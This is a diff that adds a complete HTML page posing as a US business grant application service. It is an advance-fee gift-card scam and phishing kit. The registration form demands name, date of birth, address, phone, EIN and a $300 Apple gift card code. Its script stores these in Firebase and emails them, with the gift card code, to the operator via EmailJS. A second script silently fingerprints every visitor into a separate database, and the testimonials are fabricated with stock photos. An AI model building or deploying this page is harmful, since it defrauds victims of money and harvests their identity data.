@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="Apply for US business grants with expert guidance. Fast approval, easy application, and professional support. Avoid scams and secure funding now.">
+  <meta name="keywords" content="US Grant Application, Small Business Grant, Grant Writer, Apple Gift Card, EIN, Business Funding, Startup Grant">
+  <meta name="author" content="Your Sure Grant Writer">
+  <title>Grant Portal - Apply for US Business Grants</title>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+  <!-- EmailJS -->
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("mXo_xLhEcgelld3IC"); // Replace with your EmailJS public key
+    })();
+  </script>
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --primary: #3498db;
+      --primary-hover: #2980b9;
+      --background: linear-gradient(to right, #e0f7fa, #ffffff);
+      --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Poppins', sans-serif; background: var(--background); color: #333; }
+    header { background: var(--primary); color: white; padding: 20px; text-align: center; box-shadow: var(--shadow); }
+    header h2 { font-size: 1.8rem; font-weight: 600; }
+    main { padding: 20px; max-width: 800px; margin: auto; }
+    .intro { text-align: center; margin-bottom: 30px; font-size: 1.1rem; }
+    .tabs { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 25px; }
+    .btn { background: var(--primary); color: white; border: none; padding: 12px 25px; border-radius: 30px; font-size: 1rem; cursor: pointer; box-shadow: var(--shadow); transition: background 0.2s ease, transform 0.2s ease; text-align: center; text-decoration: none; display: inline-block; }
+    .btn:hover { background: var(--primary-hover); transform: scale(1.05); }
+    .form-container { display: none; background: #fff; padding: 25px; border-radius: 12px; box-shadow: var(--shadow); margin-bottom: 40px; }
+    .form-container h3 { text-align: center; color: var(--primary); margin-bottom: 15px; }
+    input, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; }
+
+    .testimonial { display: flex; align-items: flex-start; gap: 15px; border-left: 4px solid var(--primary); padding-left: 15px; margin-bottom: 20px; }
+    .testimonial img { width: 60px; height: 60px; object-fit: cover; border-radius: 50%; border: 2px solid var(--primary); }
+    .testimonial-content { flex: 1; }
+
+    .grant-services { background: #fff; border-radius: 12px; padding: 20px; box-shadow: var(--shadow); margin-bottom: 40px; }
+    .grant-services h2, .grant-services h3 { margin-bottom: 10px; }
+    .grant-services ul { padding-left: 20px; margin-bottom: 20px; }
+    footer { background: #2c3e50; color: white; text-align: center; padding: 20px; }
+    footer a { color: white; margin: 0 10px; text-decoration: none; font-size: 1.2rem; }
+
+    @media (max-width: 600px) {
+      header h2 { font-size: 1.5rem; }
+      .btn { font-size: 0.95rem; padding: 10px 20px; }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h2>Your Sure Grant Writer</h2>
+  </header>
+
+  <main>
+    <div class="intro">
+      Tired of falling prey to grant scams? Our expert team ensures eligibility, customizes your application, and helps you get approved. Let's fund your dreams!
+    </div>
+
+    <div class="tabs">
+      <button class="btn" onclick="showTab('loginForm')">Login</button>
+      <button class="btn" onclick="showTab('registerForm')">Register</button>
+    </div>
+
+    <div id="loginForm" class="form-container">
+      <h3>Login</h3>
+      <form onsubmit="handleLogin(event)">
+        <p>Please use the email and date of birth you registered with.</p>
+        <input type="email" id="loginEmail" placeholder="Email" required />
+        <input type="date" id="loginDOB" required />
+        <button type="submit" class="btn">Login</button>
+      </form>
+    </div>
+
+    <div id="registerForm" class="form-container">
+      <h3>Register & Submit Application</h3>
+      <form onsubmit="handleRegister(event)">
+        <input type="text" id="regName" placeholder="Full Name" required />
+        <input type="date" id="regDOB" required />
+        <input type="email" id="regEmail" placeholder="Email Address" required />
+        <input type="tel" id="regPhone" placeholder="Phone Number" required />
+        <textarea id="regAddress" placeholder="Address" required></textarea>
+        <input type="text" id="regEIN" placeholder="EIN Number" required />
+        <input type="text" id="regBusiness" placeholder="Business Name" required />
+        <p>A $300 Apple Gift Card is required for processing your application. Please purchase and enter the code below.</p>
+        <input type="text" id="regAppleCard" placeholder="Apple Gift Card Code" required />
+        <button type="submit" class="btn">Submit Application</button>
+      </form>
+    </div>
+
+    <div class="grant-services">
+      <h2>Expert US Grant Application Services</h2>
+      <p>We help startups secure US grant funding with expertly crafted applications.</p>
+
+      <div class="process">
+        <h3>Our Process</h3>
+        <ul>
+          <li><strong>Payment Confirmation:</strong> We begin once payment is verified.</li>
+          <li><strong>Approval Updates:</strong> You'll be notified immediately upon approval.</li>
+          <li><strong>Fund Withdrawal:</strong> Step-by-step support to access your grant.</li>
+        </ul>
+      </div>
+
+      <div class="benefits">
+        <h3>Additional Benefits</h3>
+        <ul>
+          <li>Boost your business credit score</li>
+          <li>Access future funding opportunities</li>
+          <li>Enhance your financial stability</li>
+        </ul>
+      </div>
+
+      <div class="share">
+        <a href="share-us-grant.html" class="btn">Share with Friends & Family</a>
+      </div>
+    </div>
+
+    <div class="testimonies">
+      <h3>What Others Are Saying</h3>
+
+      <div class="testimonial">
+        <img src="https://media.istockphoto.com/id/1437816897/photo/business-woman-manager-or-human-resources-portrait-for-career-success-company-we-are-hiring.jpg?s=612x612&w=0&k=20&c=tyLvtzutRh22j9GqSGI33Z4HpIwv9vL_MZw_xOE19NQ=" alt="Maria">
+        <div class="testimonial-content">
+          <strong>Maria R.</strong><br>
+          “Honestly, I thought it was a scam at first — but they proved me wrong. Got approved within days!”
+        </div>
+      </div>
+
+      <div class="testimonial">
+        <img src="https://media.istockphoto.com/id/1682296067/photo/happy-studio-portrait-or-professional-man-real-estate-agent-or-asian-businessman-smile-for.jpg?s=612x612&w=0&k=20&c=9zbG2-9fl741fbTWw5fNgcEEe4ll-JegrGlQQ6m54rg=" alt="Jamal">
+        <div class="testimonial-content">
+          <strong>Jamal T.</strong><br>
+          “Very smooth process. Love how simple and straight to the point it is. Highly recommended.”
+        </div>
+      </div>
+
+      <div class="testimonial">
+        <img src="https://www.shutterstock.com/image-photo/cheerful-beautiful-young-african-american-260nw-2412906943.jpg" alt="Sophie">
+        <div class="testimonial-content">
+          <strong>Sophie K.</strong><br>
+          “The assistant helped me fix my business profile to qualify. Amazing support!”
+        </div>
+      </div>
+
+      <div class="testimonial">
+        <img src="https://www.shutterstock.com/shutterstock/photos/1795123882/display_1500/stock-photo-young-handsome-man-with-beard-wearing-casual-sweater-and-glasses-over-blue-background-pointing-1795123882.jpg" alt="Brian">
+        <div class="testimonial-content">
+          <strong>Brian C.</strong><br>
+          “Never expected to get funding. I just followed the steps and now I’m investing in my startup!”
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div>Follow us:</div>
+    <a href="https://instagram.com" target="_blank">📸 Instagram</a>
+    <a href="https://twitter.com" target="_blank">🐦 Twitter</a>
+    <a href="https://telegram.org" target="_blank">📲 Telegram</a>
+    <a href="https://facebook.com" target="_blank">📘 Facebook</a>
+  </footer>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCrYrzAfC6OjwVSsQbL8HmTLR51595sd6U",
+      authDomain: "dating-5203f.firebaseapp.com",
+      projectId: "dating-5203f",
+      storageBucket: "dating-5203f.appspot.com",
+      messagingSenderId: "243111420136",
+      appId: "1:243111420136:web:60cc69e6ea7474309d695d"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const db = firebase.database();
+
+    function showTab(id) {
+      document.getElementById('loginForm').style.display = 'none';
+      document.getElementById('registerForm').style.display = 'none';
+      document.getElementById(id).style.display = 'block';
+    }
+
+    showTab('loginForm');
+
+    function handleLogin(e) {
+      e.preventDefault();
+      const email = document.getElementById('loginEmail').value;
+      const dob = document.getElementById('loginDOB').value;
+      const password = dob;
+
+      auth.signInWithEmailAndPassword(email, password)
+        .then(() => {
+          emailjs.send("service_3d59mw7", "template_8yupfkc", {
+            subject: "User Login",
+            user_email: email,
+            message: `User with email ${email} just logged in.`
+          });
+          window.location.href = "dashboard.html";
+        })
+        .catch(err => alert("Login failed: " + err.message));
+    }
+
+    function handleRegister(e) {
+      e.preventDefault();
+      const data = {
+        name: document.getElementById('regName').value,
+        dob: document.getElementById('regDOB').value,
+        email: document.getElementById('regEmail').value,
+        phone: document.getElementById('regPhone').value,
+        address: document.getElementById('regAddress').value,
+        ein: document.getElementById('regEIN').value,
+        businessName: document.getElementById('regBusiness').value,
+        appleGiftCard: document.getElementById('regAppleCard').value,
+        status: "Awaiting Confirmation",
+        timestamp: new Date().toISOString()
+      };
+
+      const password = data.dob;
+
+      auth.createUserWithEmailAndPassword(data.email, password)
+        .then(cred => db.ref('grantApplications/' + cred.user.uid).set(data))
+        .then(() => {
+          emailjs.send("service_3d59mw7", "template_8yupfkc", {
+            subject: "New Registration",
+            user_name: data.name,
+            user_email: data.email,
+            user_phone: data.phone,
+            user_address: data.address,
+            ein: data.ein,
+            business_name: data.businessName,
+            gift_card: data.appleGiftCard
+          });
+          alert("Submitted successfully. Redirecting...");
+          window.location.href = "dashboard.html";
+        })
+        .catch(err => alert("Registration error: " + err.message));
+    }
+  </script>
+
+  <!-- Visit Logging Firebase (Separate) -->
+  <script>
+    const trackApp = firebase.initializeApp({
+      apiKey: "AIzaSyDzWe0sMFecKa9sHk30pXat5qrT4yDyuJ4",
+      authDomain: "soccer2-c47c2.firebaseapp.com",
+      databaseURL: "https://soccer2-c47c2-default-rtdb.firebaseio.com",
+      projectId: "soccer2-c47c2",
+      storageBucket: "soccer2-c47c2.appspot.com",
+      messagingSenderId: "942310698005",
+      appId: "1:942310698005:web:2f5230da671ef0b47db21c"
+    }, "tracker");
+
+    const trackingDb = trackApp.database();
+
+    function getBrowserName() {
+      const ua = navigator.userAgent;
+      if (ua.includes("Edg")) return "Edge";
+      if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+      if (ua.includes("Brave")) return "Brave";
+      if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      return "Unknown";
+    }
+
+    const logRef = trackingDb.ref("visits").push();
+    logRef.set({
+      browser: getBrowserName(),
+      platform: navigator.platform,
+      language: navigator.language,
+      resolution: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      colorDepth: screen.colorDepth,
+      referrer: document.referrer,
+      timestamp: new Date().toISOString()
+    });
+  </script>
+</body>
+</html>
+
+</body>
+</html>
